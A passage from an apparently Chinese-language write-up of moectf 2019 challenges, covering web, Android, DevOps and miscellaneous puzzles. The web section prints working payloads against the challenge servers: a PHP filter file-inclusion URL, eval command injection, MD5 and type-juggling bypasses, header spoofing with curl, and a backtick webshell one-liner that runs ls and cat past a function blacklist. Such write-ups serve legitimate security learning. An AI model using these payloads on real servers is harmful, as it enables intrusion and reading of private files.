</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">+=</span> <span class="n">table</span><span class="p">.</span><span class="n">length</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">table</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 算出来的明文长这样, 注意要竖着输进去
</span></span></span><span class="line"><span class="cl"><span class="c1">// 49 0  5  7  8  56 57 28
</span></span></span><span class="line"><span class="cl"><span class="c1">// 57 62 34 0  45 52 33 65
</span></span></span><span class="line"><span class="cl"><span class="c1">// 15 45 58 45 63 45 33 49
</span></span></span><span class="line"><span class="cl"><span class="c1">// 58 26 1  57 16 29 2  64
</span></span></span></code></pre></div><p><code>flag</code>: <code>moectf{L1n2ar_Alg2bRa_1S_so0O_D1ffiCuLt}</code></p>
<h2 id="web">Web</h2>
<h3 id="get">GET</h3>
<p>浏览器打开<code>http://39.108.11.206:10002/?a</code>拿到<code>flag</code>.</p>
<h3 id="post">POST</h3>
<p>去网上找了个叫<code>HackBar</code>的东西, 然后就<code>post</code>了&hellip;</p>
<p>不过后来用脚本的办法, 拓展性高一点:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://39.108.11.206:10001/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datas</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="introducing-web">Introducing Web</h3>
<p>打开网页, 然后按F12, 然后..就没有然后了..</p>
<h3 id="easy-limitation">Easy Limitation</h3>
<p>打开网页, 保存到本地, 打开HTML, 把下面这句:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;key&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;14&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;只需要输入msc_1s_Gre@t即可获取flag&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>里的<code>maxlength</code>改成15或者更大的数, 然后本地浏览器打开改好的html, 输入, 提交, 拿到<code>flag</code>.</p>
<h3 id="procotol">Procotol</h3>
<p>从php的官方文档里读了好久&hellip;然后拼出来这么一句:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://39.108.11.206:10003/?file=php://filter/read=convert.base64-encode/resource=./index.php
</span></span></code></pre></div><p>浏览器打开后能看到一串<code>base64</code>串, 复制下来解码:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="cp">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="cp">error_reporting(0);
</span></span></span><span class="line"><span class="cl"><span class="cp">echo &#39;&lt;p&gt;the flag was put in the index.php, can you get it?&lt;/p&gt;&#39;;
</span></span></span><span class="line"><span class="cl"><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">$file=$_GET[&#39;file&#39;];
</span></span></span><span class="line"><span class="cl"><span class="cp">include($file);
</span></span></span><span class="line"><span class="cl"><span class="cp">//moectf{YoU_g0t_f1@g}
</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span>
</span></span></code></pre></div><p>然后就拿到<code>flag</code>了&hellip;</p>
<p>说来这种把源码换成<code>base64</code>再输出防止被执行的方法真骚啊..</p>
<h3 id="restrictions">Restrictions</h3>
<p>搜索引擎会读取站点下的<code>robots.txt</code>来判断爬取哪些页面. 然后我们打开<code>https://moectf.cn/robots.txt</code>, 发现提示有什么脚本被执行了删掉了<code>flag</code>&hellip;</p>
<p>打开设置禁用JS脚本, 刷新网页, F12, 在源代码里看见<code>flag</code>&hellip;</p>
<h3 id="是时候展示十八年单身的手速了">是时候展示十八年单身的手速了</h3>
<p>这道题要用到<code>WireShark</code>&hellip;然后点开WireShark, 打开端口然后刷新页面, 然后在捕获的列表里面找一个HTTP 302, 然后双击查看详细信息, 就能找到<code>flag</code>了.</p>
<h3 id="英国人">英国人</h3>
<p>这道题很秀…. 用<code>nslookuptool</code>的在线查询网站可以查到<code>region.challenge.moectf.cn</code>的全球<code>dns</code>信息, 然后找到了域名在英国被解析的地址, 然后修改一下<code>hosts</code>, 唱跳rap篮球+F5, 就拿到<code>flag</code>了.</p>
<h3 id="amazing_eval">Amazing_Eval</h3>
<p>了解了一下<code>eval()</code>函数..</p>
<p>然后打开<code>http://39.108.11.206:10006/?cmd=‘echo “$flag”’</code>就好了.</p>
<h3 id="今天你备份了嘛">今天你备份了嘛</h3>
<p>这道题上网必应了一下, 然后打开<code>http://39.108.11.206:10011/index.php.swp</code>, 就拿到<code>flag</code>了.</p>
<h3 id="php-弱类型">PHP 弱类型</h3>
<p>我真的想吐槽PHP不愧是被骂成全世界最懒烂的语言&hellip;</p>
<p><code>http://39.108.11.206:10005/?a=&quot;0”</code></p>
<p>php判断相等时, 字符串会被解释成0. 打开上面网址拿到<code>flag</code>.</p>
<h3 id="php_md5">PHP_md5()</h3>
<p>哇塞php是真的不安全&hellip;必应了一下php的MD5漏洞, 然后打开<code>http://39.108.11.206:10007/?username=240610708&amp;passwd=QNKCDZO</code>, 就拿到了<code>flag</code>: <code>moectf{You_UnderStAnd_mD5_betTer!}</code></p>
<p>这是因为<code>240610708</code>和<code>QNKCDZO</code>的MD5()计算结果竟然是一样的!</p>
<h3 id="神奇的正则表达式">神奇的正则表达式</h3>
<p>小小学了下正则表达式, 然后改了一下之前post用的脚本:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span><span class="s2">&#34;aflagdddd/6/:skey&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://39.108.11.206:10009/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datas</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span></code></pre></div><p>成功通过.</p>
<h3 id="头">头</h3>
<p>这题真的狠&hellip;算了要文明&hellip;</p>
<p>用<code>curl</code>连试了好几次终于过了:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ curl --header &#34;Cookie: login=true&#34; --header &#34;User-Agent: PowerPC&#34; --header &#34;Accept: application/flag&#34; -v -i http://47.101.32.101:10010/
</span></span></code></pre></div><p>就是按照网页的提示改HTTP请求头就好了.</p>
<p><code>flag</code>: <code>moectf{M0m_I_c4n_m0dify_HTTP_H3aders!}</code></p>
<p>这个<code>flag</code>写的也让人很想吐槽&hellip;.</p>
<h3 id="stronger_php">stronger_php</h3>
<p>这个竟然判断md5==sha1…&hellip;.</p>
<p>用数组绕过, 浏览器打开<code>http://39.108.11.206:10008/?a[]&amp;b[]=123123</code></p>
<p>得到<code>flag</code>: <code>moectf{Y0u_can_st1ll_defeat_m3}</code></p>
<h3 id="终极http请求头">终极HTTP请求头</h3>
<p>我!!!!! 想杀人&hellip;</p>
<p>先挂出来我的狗血历程🙃:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">## 上面省略2232行尝试的代码
</span></span><span class="line"><span class="cl">rever@DS-10001-RX MINGW64 ~
</span></span><span class="line"><span class="cl">$ curl --header &#34;Referer: www.xidian.edu.cn&#34; --header &#34;User-Agent: moectf_browser&#34; --header &#34;X-Forwarded-For: 127.0.0.1&#34; --header &#34;Cookie: xduer&#34; --header &#34;Accept: PHP&#34; --header &#34;Accept-Encoding: UTF-8&#34; --header &#34;Accept-Language: zh-CN&#34; -v -i http://39.108.11.206:10012/
</span></span><span class="line"><span class="cl">*   Trying 39.108.11.206...
</span></span><span class="line"><span class="cl">* TCP_NODELAY set
</span></span><span class="line"><span class="cl">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class="line"><span class="cl">                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class="line"><span class="cl">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 39.108.11.206 (39.108.11.206) port 10012 (#0)
</span></span><span class="line"><span class="cl">&gt; GET / HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; Host: 39.108.11.206:10012
</span></span><span class="line"><span class="cl">&gt; Referer: www.xidian.edu.cn
</span></span><span class="line"><span class="cl">&gt; User-Agent: moectf_browser
</span></span><span class="line"><span class="cl">&gt; X-Forwarded-For: 127.0.0.1
</span></span><span class="line"><span class="cl">&gt; Cookie: xduer
</span></span><span class="line"><span class="cl">&gt; Accept: PHP
</span></span><span class="line"><span class="cl">&gt; Accept-Encoding: UTF-8
</span></span><span class="line"><span class="cl">&gt; Accept-Language: zh-CN
</span></span><span class="line"><span class="cl">&gt;
</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">&lt; Date: Fri, 06 Sep 2019 14:41:00 GMT
</span></span><span class="line"><span class="cl">&lt; Server: Apache/2.4.7 (Ubuntu)
</span></span><span class="line"><span class="cl">&lt; X-Powered-By: PHP/5.5.9-1ubuntu4.14
</span></span><span class="line"><span class="cl">&lt; Vary: Accept-Encoding
</span></span><span class="line"><span class="cl">&lt; Content-Length: 443
</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html
</span></span><span class="line"><span class="cl">&lt;
</span></span><span class="line"><span class="cl">{ [443 bytes data]
</span></span><span class="line"><span class="cl">100   443  100   443    0     0   3141      0 --:--:-- --:--:-- --:--:--  3141HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">Date: Fri, 06 Sep 2019 14:41:00 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.7 (Ubuntu)
</span></span><span class="line"><span class="cl">X-Powered-By: PHP/5.5.9-1ubuntu4.14
</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
</span></span><span class="line"><span class="cl">Content-Length: 443
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">First of all, you must come from XiDian University&lt;br&gt;Second, you have to use moectf_browser&lt;br&gt;Third, you have to visit from the localhost&lt;br&gt;Fourth, your identity must be xduer&lt;br&gt;Fifth, client can only accept PHP documents&lt;br&gt;Sixth, we only allow UTF-8 encoding&lt;br&gt;Finally, we are only allowed to use Chinese.&lt;br&gt;Congratulations on having a good understanding of HTTP HEADERS and finally getting flag:&lt;br&gt;moectf{Reward_y0u_For_per3everAnce}
</span></span><span class="line"><span class="cl">* Connection #0 to host 39.108.11.206 left intact
</span></span></code></pre></div><p>试到最后一步看见<code>flag</code>里的那个<code>perseverance</code>我当时就想从四楼跳下去&hellip;</p>
<h3 id="朝鲜人">朝鲜人</h3>
<p>朝鲜人! wd**d, 我去哪儿找朝鲜dns啊QAQ</p>
<p>必应了好久找到一个阿里云的EDNS-CLIENT-SUBNET的使用介绍, 在我的<code>Open SUSE Tumbleweed</code>中运行如下:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wget ftp://ftp.isc.org/isc/bind9/9.9.3/bind-9.9.3.tar.gz
</span></span><span class="line"><span class="cl">$ tar xf bind-9.9.3.tar.gz
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> bind-9.9.3
</span></span><span class="line"><span class="cl">$ wget http://wilmer.gaa.st/edns-client-subnet/bind-9.9.3-dig-edns-client-subnet-iana.diff
</span></span><span class="line"><span class="cl">$ yum -y install patch
</span></span><span class="line"><span class="cl">$ patch -p0 &lt; bind-9.9.3-dig-edns-client-subnet-iana.diff
</span></span><span class="line"><span class="cl">$ ./configure --without-openssl
</span></span><span class="line"><span class="cl">$ make
</span></span></code></pre></div><p>然后终端执行:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ /bin/dig/dig @8.8.8.8 region.challenge.moectf.cn +client<span class="o">=</span>175.45.176.68
</span></span></code></pre></div><p><code>edns</code>其实就是查询<code>dns</code>服务器的时候手动告知<code>dns</code>你是哪里的人, 然后<code>dns</code>就会返回一个你该访问的地址. 得到朝鲜解析的IP之后, 老方法修改<code>hosts</code>, 就得到了朝鲜人的<code>flag</code>.</p>
<p>从企鹅大佬的博客上找到了关于edns的详细解释, 现在很不要脸的引用过来:</p>
<blockquote>
<h3 id="1什么是edns"><em>1、什么是EDNS？</em></h3>
<p>​    EDNS就是在遵循已有的DNS消息格式的基础上增加一些字段，来支持更多的DNS请求业务。</p>
<p>需要注意的是，像DNS服务器这样一个大型且广泛应用的系统软件，新增加扩展协议的时候一定要考虑到向后兼容性(backward compatibility)，即你增加了你这个特性的消息传输给未支持该特性的服务器时，后者依然能正确处理。</p>
<h3 id="2为什么要有-edns">2、为什么要有 EDNS？</h3>
<p>​    RFC2671中指出EDNS被提出来的几个理由：</p>
<p>​        1）DNS协议头部的第二个16字节中都已经被用的差不多了，需要添加新的返回类型(RCODE)和标记(FLAGS)来支持其他需求；</p>
<p>​        2）只为标示domain类型的标签分配了两位，现在已经用掉了两位（00标示字符串类型，11表示压缩类型），后面如果有更多的标签类型则无法支持；</p>
<p>​        3）当初DNS协议中设计的用UDP包传输时包大小限制为512字节，现在很多主机已经具备重组大数据包的能力，所以要有一种机制来允许DNS请求方通知DNS服务器让其返回大包；</p>
<p>​        以后我们会看到，DNSSEC机制和edns-client-subnet机制等都需要有EDNS的支持。</p>
<h3 id="3edns-的内容是什么"><em>3、EDNS 的内容是什么？</em></h3>
<p>​        怎样在DNS消息协议的基础上再增加一些字段呢？为了保持向后兼容性，更改已有的DNS协议格式是不可能的，所以只能在DNS协议的数据部分中做文章。</p>
<p>​        所以，EDNS中引入了一种新的伪资源记录OPT（Resource Record），之所以叫做伪资源记录是因为它不包含任何DNS数据，OPT RR不能被cache、不能被转发、不能被存储在zone文件中。OPT被放在DNS通信双方（requestor和responsor）DNS消息的Additional data区域中。</p>
<p>转自 赤道企鹅™的博客</p>
</blockquote>
<h3 id="dynamic">Dynamic</h3>
<p>这道题是考思维定势的&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="err">&lt;</span>?php
</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
</span></span><span class="line"><span class="cl">error_reporting(0);
</span></span><span class="line"><span class="cl">$blacklist = [&#34;system&#34;, &#34;ini_set&#34;, &#34;exec&#34;, &#34;scandir&#34;, &#34;shell_exec&#34;, &#34;proc_open&#34;, &#34;error_log&#34;, &#34;ini_alter&#34;, &#34;ini_set&#34;, &#34;pfsockopen&#34;, &#34;readfile&#34;, &#34;echo&#34;, &#34;file_get_contents&#34;, &#34;readlink&#34;, &#34;symlink&#34;, &#34;popen&#34;, &#34;fopen&#34;, &#34;file&#34;, &#34;fpassthru&#34;];
</span></span><span class="line"><span class="cl">$blacklist = array_merge($blacklist, get_defined_functions()[&#39;internal&#39;]);
</span></span><span class="line"><span class="cl">foreach($blacklist as $i){
</span></span><span class="line"><span class="cl">    if(stristr($_GET[cmd], $i)!==false){
</span></span><span class="line"><span class="cl">        die(&#39;hack&#39;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">eval($_GET[cmd]);
</span></span></code></pre></div><p>打开题目的代码长这样, 能看到<code>blacklist</code>里面禁用了好多用来输出和操作文件的函数&hellip; 怎么办? 于是我研究了好久<code>PHP</code>的漏洞, 包括<code>stristr()</code>的漏洞, 最后除了发现<code>print()</code>函数还能用之外什么都做不了&hellip;</p>
<p>但是咧, 经过大哥的点拨, 我明白了, <code>PHP</code>的函数不能用, 但是我们可以用<code>Linux</code>的指令呀!!!</p>
<p>于是我们分析代码, 发现首先是没有除了<code>cmd</code>之外的变量供我们使用的, 所以我们需要构建一个新的变量. 这新的变量的名字我们暂且叫<code>str</code>好了, 反正也没有什么关系.. ( 因为我大哥这么取的名字 )</p>
<p>接下来我们要读取这个<code>str</code>里的东西, 然后<code>print</code>出来. 最后跟上<code>id</code>的内容..</p>
<p>但是怎么调用<code>Linux</code>的函数呢.?</p>
<p>这要提到<code>PHP</code>里面又一个神奇的东西: 反引号: &lsquo;`&rsquo;.</p>
<p><code>PHP</code>会把包含在反引号里面的东西当成<code>Shell</code>指令执行.</p>
<p>所以, 我们就可以快乐的构建一句话木马啦!</p>
<p>Like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span><span class="k">print</span><span class="o">%</span><span class="mi">20</span><span class="sb">`$str`</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="nx">ls</span>
</span></span></code></pre></div><p>这样我们就可以调用<code>ls</code>指令来查看服务器当前文件夹里都有些什么东东..</p>
<p>然后我们看见了两个文件, 一个是<code>4f5f6c3be6ab7cc59dabf9ff7f2b248a </code> 另一个是<code>index.php</code>..</p>
<p><code>flag</code>自然不可能存在<code>index.php</code>里啦, 我们用<code>Linux</code>里的<code>cat</code>指令来查看那个乱码文件里是些什么东西:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span><span class="k">print</span><span class="o">%</span><span class="mi">20</span><span class="sb">`$str`</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="nx">cat</span><span class="o">+</span><span class="mi">4</span><span class="nx">f5f6c3be6ab7cc59dabf9ff7f2b248a</span>
</span></span></code></pre></div><p>然后就拿到<code>flag</code>啦&hellip;</p>
<p><code>flag</code>: <code>moectf{PLEASE_USE_disable_function!!!!!!}</code></p>
<h2 id="android">Android</h2>
<h3 id="android_signin">Android_Signin</h3>
<p>手机下载, 打开, 拿flag.</p>
<h3 id="clickit">ClickIt</h3>
<p>我教你们物理做法!</p>
<p>首先准备一个2.8V电动机, 然后找到一根棉签, 可以通过导线或者锡箔的方法让其可以被手机电容屏识别, 然后放在一个支架上.</p>
<p>电动机接好电源后, 在一段放置一个拨片,让其每转一圈拨片都会拨一下棉签, 最后把手机放在棉签头下面, 打开开关, 睡觉.</p>
<p>第二天早上起来就可以交<code>flag</code>了.</p>
<h2 id="devops">DevOps</h2>
<h3 id="sni">SNI</h3>
<p>这道题拿火狐打开可以发现证书只适用于<code>*.sspirits.top</code>, 于是修改<code>hosts</code>文件再修改HTTP请求头的Host, 然后就拿到了<code>flag</code> ( 但是我重新做的时候发现不对了&hellip; 我也很疑惑 )</p>
<h3 id="sni-1">SNI++</h3>
<p>这道题好像很好做..题目的地址: <code>176.9.166.200</code></p>
<p>我使用了<code>nslookup</code>, 然后反查到了域名:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">200.166.9.176.in-addr.arpa      name = vps.stockservers.com.
</span></span></code></pre></div><p>然后修改<code>hosts</code>文件,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">176.9.166.200 vps.stockservers.com
</span></span></code></pre></div><p>然后刷新网络再用火狐打开, 看到证书不匹配的安全警告点击跳过, 然后就拿到了<code>flag</code>.</p>
<h2 id="misc">MISC</h2>
<h3 id="世界辣么大">世界辣么大</h3>
<p>就把程序拉开就行了, 程序窗口大小可变.</p>
<h3 id="easy-base64">Easy base64</h3>
<p>扔进在线解密网站里.</p>
<h3 id="网线大鲨鱼">网线大鲨鱼</h3>
<p>拿<code>WireShark</code>打开, 然后导出数据, 在文件名那里就可以看见<code>flag</code>.</p>
<h3 id="你的脑洞够大吗">你的脑洞够大吗</h3>
<p>这道题!!!</p>
<p>先下载程序, 打开后去哪里找key, 然后给了一串数字, 说网络情缘一线牵.</p>
<p>网络情缘一线牵想到了QQ号, 然后打开QQ添加好友, 然后在主页照片墙看见另一个大佬的QQ号, 开了一堆会员.. 把QQ复制下来粘贴进key里面, 发现不对. 搜索这个人的QQ, 发现没有什么信息, 只有个人说明上有俩网址, 是吃鸡透视外挂的网址. 于是回到最开始的QQ账号, 点击添加好友, 在验证问题上看到了XDSEC的大佬ID, 明白这肯定是Key, 复制下来放进Key, 点了一下提示百朵云中定有不一样的颜色, 于是打开百度云, 把输入框里产生的那串乱码粘贴到百度网盘分享地址里, 然后打开发现需要提取码. 想起来题目上给的提取码 <code>2m54</code> , 输进去, 果然是对的. 下载得到一个压缩包.解压后发现一个脚本和一个txt, 提示说多一个1也算失误. 然后打开脚本字串去掉开头的1, 剩下扔进base64, 解出得到<code>flag</code>. ( 这是我做过最像黑客的一道题, 确实很考脑洞但是很好玩, 富有挑战性. )</p>
<h3 id="被伪加密的文档">被伪加密的文档</h3>
<p>说来巧, 前几天下载注册机, 然后一不小心给电脑上装了360全家桶, 然后删软件时没删完, 不小心留了个360压缩&hellip; 然后做这题的时候压缩包就直接正常解压了!</p>
<p>然后就拿到<code>flag</code>了&hellip; 从那以后我觉得360压缩就留在电脑里吧&hellip;</p>
<p>正常做法是修改zip文件的hex码, 然后把标识是否加密的那个位给改过来.</p>
<h3 id="修复分离">修复&amp;分离</h3>
<p>用PS打开图片发现前半个<code>flag</code>, 然后拖进<code>Linux</code>用<code>binwalk</code>跑了一下发现有压缩包后缀, 就强行改成<code>zip</code>打开, 里面有一<code>txt</code>, 解压得到后半个<code>flag</code>.</p>
<h3 id="keyboard">Keyboard</h3>
<p>这道题不用题解了吧&hellip; 就跟着文件里的按键顺序按一遍就好了&hellip;.</p>
<h3 id="恼人的aliga">恼人的Aliga</h3>
<p>爱酱是真的漂亮!</p>
<p>好吧这不是重点&hellip; 重点就是&hellip; 你选中图片最下面没有<code>aliga</code>部分, 然后拉伸变形可以得到一个条形码..但是咧, 条形码扫不出来&hellip; 后来分析一下发现边界是白条, 这显然不是条形码应该有的样子, 就处理成反相然后拿微信扫一扫获取<code>flag</code>.</p>
<h3 id="secret-code">Secret Code</h3>
<p>这个题嘛..也是社工, 我还买了hint&hellip;</p>
<p>把代码<code>base64</code>解密得到一串乱码, 加上从囧姐姐的主页看见的酷似提取码的东西, 于是再度打开百度云&hellip; 然后看见了帅气的PWN爷s@d. 拖进<code>WinHex</code>, 搜索<code>moectf</code>找到<code>flag</code>.</p>
<h3 id="base64">Base64?</h3>
<p>哇塞这道题是真的做了很久很久&hellip;</p>
<p>其实是考的是Base64的原理, 上网<code>bing</code>了一下, 大致就是把字符变成二进制串然后重新分组重新断句, 就很神奇&hellip;</p>
<p>先给<code>table</code>编号,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00000000 x
</span></span><span class="line"><span class="cl">00000001 y
</span></span><span class="line"><span class="cl">00000010 U
</span></span><span class="line"><span class="cl">00000011 V
</span></span><span class="line"><span class="cl">00000100 z
</span></span><span class="line"><span class="cl">00000101 A
</span></span><span class="line"><span class="cl">00000110 B
</span></span><span class="line"><span class="cl">00000111 C
</span></span><span class="line"><span class="cl">00001000 D
</span></span><span class="line"><span class="cl">00001001 E
</span></span><span class="line"><span class="cl">00001010 F
</span></span><span class="line"><span class="cl">00001011 G
</span></span><span class="line"><span class="cl">00001100 H
</span></span><span class="line"><span class="cl">00001101 I
</span></span><span class="line"><span class="cl">00001110 J
</span></span><span class="line"><span class="cl">00001111 K
</span></span><span class="line"><span class="cl">00010000 L
</span></span><span class="line"><span class="cl">00010001 M
</span></span><span class="line"><span class="cl">00010010 N
</span></span><span class="line"><span class="cl">00010011 O
</span></span><span class="line"><span class="cl">00010100 a
</span></span><span class="line"><span class="cl">00010101 b
</span></span><span class="line"><span class="cl">00010110 c
</span></span><span class="line"><span class="cl">00010111 d
</span></span><span class="line"><span class="cl">00011000 e
</span></span><span class="line"><span class="cl">00011001 f
</span></span><span class="line"><span class="cl">00011010 g
</span></span><span class="line"><span class="cl">00011011 h
</span></span><span class="line"><span class="cl">00011100 i
</span></span><span class="line"><span class="cl">00011101 j
</span></span><span class="line"><span class="cl">00011110 k
</span></span><span class="line"><span class="cl">00011111 l
</span></span><span class="line"><span class="cl">00100000 m
</span></span><span class="line"><span class="cl">00100001 W
</span></span><span class="line"><span class="cl">00100010 X
</span></span><span class="line"><span class="cl">00100011 Y
</span></span><span class="line"><span class="cl">00100100 Z
</span></span><span class="line"><span class="cl">00100101 0
</span></span><span class="line"><span class="cl">00100110 1
</span></span><span class="line"><span class="cl">00100111 2
</span></span><span class="line"><span class="cl">00101000 3
</span></span><span class="line"><span class="cl">00101001 4
</span></span><span class="line"><span class="cl">00101010 5
</span></span><span class="line"><span class="cl">00101011 6
</span></span><span class="line"><span class="cl">00101100 7
</span></span><span class="line"><span class="cl">00101101 8
</span></span><span class="line"><span class="cl">00101110 9
</span></span><span class="line"><span class="cl">00101111 P
</span></span><span class="line"><span class="cl">00110000 Q
</span></span><span class="line"><span class="cl">00110001 R
</span></span><span class="line"><span class="cl">00110010 S
</span></span><span class="line"><span class="cl">00110011 T
</span></span><span class="line"><span class="cl">00110100 n
</span></span><span class="line"><span class="cl">00110101 o
</span></span><span class="line"><span class="cl">00110110 p
</span></span><span class="line"><span class="cl">00110111 q
</span></span><span class="line"><span class="cl">00111000 r
</span></span><span class="line"><span class="cl">00111001 s
</span></span><span class="line"><span class="cl">00111010 t
</span></span><span class="line"><span class="cl">00111011 u
</span></span><span class="line"><span class="cl">00111100 v
</span></span><span class="line"><span class="cl">00111101 w
</span></span></code></pre></div><p>编好之后, 就可以通过查表的方式把密文翻译成二进制形式, 然后把每一段二进制的前两位0给去掉, 重新按照八位分组, 对照ASCII表就可以翻译出来. 这道题是在火车上写的, 就纯手撕了&hellip; 没有代码.. 不过查表和重新拼接的代码实现应该不怎么难&hellip;</p>
<h3 id="aiaiai">AiAiAi</h3>
<p>作为第一个做出来这道题的人! 我要好好骄傲一会儿!</p>
<p>这道题其实就是音频隐写. 从<code>Ardour</code>的频谱上可以很清楚的看见尾部有东西..</p>
<p>于是放大了看, 发现一些酷似莫尔斯电码的东西, 解码提交.</p>
<h3 id="osu-master">Osu Master</h3>
<p>就把这题玩过去就行了..</p>
<p>画的轨迹就是<code>flag</code>.</p>
<h3 id="sd的嘲讽表情">s@d的嘲讽表情</h3>
<p>这道题..</p>
<p>反正我PWN爷最帅呗&hellip;</p>
<p>下载了图片拿<code>stegsolve</code>打开, 提取数据选择<code>RGB</code>的最低位, <code>LSB First</code>, 然后方式选择<code>BGR</code>, 点击<code>Preview</code>, 就可以看见<code>flag</code>了&hellip;</p>
<h3 id="kokoro">Kokoro</h3>
<p>这题需要一个男朋友 ( BF )🙃</p>
<p>BF就是<code>BrainFuck</code>啦&hellip;.想什么呢</p>
<p>打开文件之后手动展开, 如果是 20. ,展开之后就是20个 . ,以此类推, 全部展开了扔进Ook! 编码解码器里解出来<code>flag</code>.</p>
<h3 id="show-off">Show Off</h3>
<p>最后一题了QAQ</p>
<p>写完睡觉!</p>
<p>这道题我擦二维码擦了一下午才擦干净&hellip;</p>
<p>然后就想方设法地实现这个函数了…</p>
<p>最后借鉴了大佬的作品, 才勉强把这题弄出来..</p>
<p>用<code>stegsolve</code>打开二维码进行频率分析可以得到代码里的<code>dic</code>, 然后</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bit</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># implement this</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 请实现这一函数</span>
